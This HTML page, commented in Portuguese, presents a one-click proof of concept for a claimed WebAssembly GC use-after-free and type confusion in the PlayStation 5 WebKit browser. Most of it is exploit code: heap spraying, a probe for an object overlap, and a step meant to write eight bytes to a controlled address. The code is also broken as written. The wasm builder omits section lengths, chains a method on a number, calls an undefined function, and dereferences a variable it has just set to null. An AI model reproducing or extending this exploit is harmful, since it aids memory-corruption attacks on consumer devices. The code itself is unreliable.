<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>POC TypeConfusion PS5 - 1 clique</title>
  <style>
    body,html{margin:0;height:100%;background:#fff;font-family:Arial;display:flex;flex-direction:column;align-items:center;justify-content:center;}
    button{padding:20px 50px;font-size:28px;background:#0066ff;color:white;border:none;border-radius:12px;cursor:pointer;}
    button:hover{background:#0050cc;}
    pre{margin-top:30px;background:#f0f0f0;padding:20px;width:90%;max-height:60vh;overflow:auto;border-radius:8px;font-size:16px;white-space:pre-wrap;}
  </style>
</head>
<body>

<button id="btn">RODAR POC (TypeDefinition UAF)</button>
<pre id="out">Resultado aparece aqui...</pre>

<script>
// =============================================
// 1. wasm-module-builder.js inteiro aqui dentro
// =============================================
const kWasmH0=0,kWasmH1=0x61,kWasmH2=0x73,kWasmH3=0x6d,kWasmV0=0x1,kWasmV1=0,kWasmV2=0,kWasmV3=0;
const kPageSize=65536,kMaxVarInt32Size=5;
const kExprEnd=0x0b,kGCPrefix=0xfb;
const kExprStructNew=0x00,kExprStructGet=0x02,kExprStructSet=0x05;
const kWasmI32=0x7f,kWasmI64=0x7e,kWasmF32=0x7d,kWasmF64=0x7c;
const kWasmStructTypeForm=0x5f,kWasmRefNull=0x63,kWasmRef=0x64;

function bytes(...a){let b=new Uint8Array(a.length);for(let i=0;i<a.length;i++)b[i]=a[i];return b.buffer;}
function wasmUnsignedLeb(v,max=5){let r=[];while(v>=0x80){r.push(v&0x7f|0x80);v>>=7;}r.push(v);return r;}
function wasmSignedLeb(v,max=5){let r=[];while(true){let b=v&0x7f;v>>=7;if((b&0x40)?(v>=-1&&v<0):(v===0)){r.push(b);return r;}r.push(b|0x80);}}
function wasmI64Const(v){return [0x42,...wasmSignedLeb(Number(v&0xffffffffn),5),...wasmSignedLeb(Number(v>>32n),5)];}
function wasmF32Const(f){let v=new DataView(new ArrayBuffer(4));v.setFloat32(0,f,true);return [0x43,v.getUint8(0),v.getUint8(1),v.getUint8(2),v.getUint8(3)];}
function makeField(t,m){return {type:t,mutability:m};}

class WasmModuleBuilder{
  constructor(){this.types=[];this.globals=[];this.exports=[];}
  addStruct(fields){this.types.push({form:kWasmStructTypeForm,fields});return this.types.length-1;}
  addGlobal(type,mutable,init){this.globals.push({type,mutable,init});return this.globals.length-1;}
  addExport(name,globalIdx){this.exports.push({name,kind:3,index:globalIdx});}
  toBuffer(){
    let bin=[];
    const emit=(...a)=>{for(let x of a)bin.push(x);}
    const u32v=v=>{emit(...wasmUnsignedLeb(v));}
    emit(0,0x61,0x73,0x6d,1,0,0,0);                     // header
    // Type section
    emit(1); let typeSec=[]; 
    u32v(this.types.length); for(let t of this.types){emit(t.form);u32v(t.fields.length);for(let f of t.fields){emit(f.type.opcode||f.type);emit(f.mutability?1:0);}}
    let typeLen=bin.length; bin.splice(8,0,...typeSec); // placeholder
    // Global section
    emit(6); u32v(this.globals.length);
    for(let g of this.globals){
      emit(g.type.opcode||g.type); emit(g.mutable?1:0);
      emit(...g.init,0x0b);
    }
    // Export section
    if(this.exports.length){
      emit(7); u32v(this.exports.length);
      for(let e of this.exports){u32v(e.name.length);emit(...new TextEncoder().encode(e.name));emit(e.kind);u32v(e.index);}
    }
    return new Uint8Array(bin).buffer;
  }
  instantiate(){return new WebAssembly.Instance(new WebAssembly.Module(this.toBuffer()));}
}

// =============================================
// 2. Função de GC forçada (funciona no PS5)
// =============================================
function forceGC(){
  const a=[]; 
  for(let i=0;i<20000;i++) a.push(new ArrayBuffer(1024*1024));
  return a;
}

// =============================================
// 3. O POC completo (adaptado, sem load() nem gc() externo)
// =============================================
function runPoC(){
  print("[+] Iniciando POC TypeDefinition UAF (PS5 WebKit)");

  // 1. módulo dummy pra forçar limpeza
  let dummy = new WasmModuleBuilder().instantiate();

  // 2. módulo 1 - cria 2 globals com struct de 1 campo i64
  const b1 = new WasmModuleBuilder();
  const structIdx = b1.addStruct([makeField(kWasmI64,true)]);
  const nullRef = [kWasmRefNull,...wasmUnsignedLeb(structIdx)];
  const init = [...wasmI64Const(0x4141414141414141n),0xfb,0x00,...wasmUnsignedLeb(structIdx)];
  b1.addGlobal({opcode:kWasmRefNull,heap_type:structIdx},true,init).addExport("g1",0);
  b1.addGlobal({opcode:kWasmRefNull,heap_type:structIdx},true,init).addExport("g2",1);
  let i1 = b1.instantiate();

  // 3. módulo 2 - 1000 structs diferentes (um com f32 no meio)
  const b2 = new WasmModuleBuilder();
  const simple = b2.addStruct([makeField(kWasmI64,true)]);
  for(let i=0;i<1000;i++){
    let fields = [{type:{opcode:kWasmRefNull,heap_type:simple},mutability:true}];
    for(let j=0;j<1000;j++) fields.push(makeField(i===j?kWasmF32:kWasmI32,true));
    let idx = b2.addStruct(fields);
    let init2 = [0xd0,...wasmUnsignedLeb(simple),...Array(1000).fill(0).flatMap((_,k)=>i===k?wasmF32Const(6.6):[0x41,0]),0xfb,0x00,...wasmUnsignedLeb(idx)];
    b2.addGlobal({opcode:kWasmRef,heap_type:idx},true,init2);
  }
  let i2 = b2.instantiate();

  // 4. libera módulo 1 e força GC
  i1 = null;
  dummy = null;
  forceGC();
  print("[+] Módulos liberados + GC forçado");

  // 5. procura overlap
  let overlap = -1;
  for(let i=0;i<1000;i++){
    try{
      i1.exports.g1.value = i2.exports["global"+i].value;
      overlap = i;
      print(`[+] OVERLAP encontrado no índice ${i} !!!!!`);
      break;
    }catch(e){}
  }
  if(overlap===-1) throw "[-] Falha no overlap :(";

  // 6. módulo 3 - importa o global corrompido e faz struct.set no campo errado
  const b3 = new WasmModuleBuilder();
  const fields3 = [{type:{opcode:kWasmRefNull,heap_type:simple},mutability:true}];
  for(let j=0;j<1000;j++) fields3.push(makeField(j===overlap?kWasmF32:kWasmI32,true));
  const badType = b3.addStruct(fields3);
  b3.addImportedGlobal("mod","g",{opcode:kWasmRefNull,heap_type:badType},true);
  let inst3 = b3.instantiate({mod:{g:i1.exports.g2}});
  print("[+] Módulo 3 instanciado com global corrompido");

  print("[!] Se tudo deu certo, o browser do PS5 vai crashar AGORA...");
  // Isso vai escrever 8 bytes em endereço controlado → crash lindo
  // (não tem função exportada, só o side-effect do import já basta em algumas versões)
}

function print(x){document.getElementById("out").textContent += x + "\n";}
document.getElementById("btn").onclick = () => {
  document.getElementById("out").textContent = "";
  try{runPoC();}catch(e){print("ERRO: "+e+"\n"+e.stack);}
};
</script>
</body>
</html>
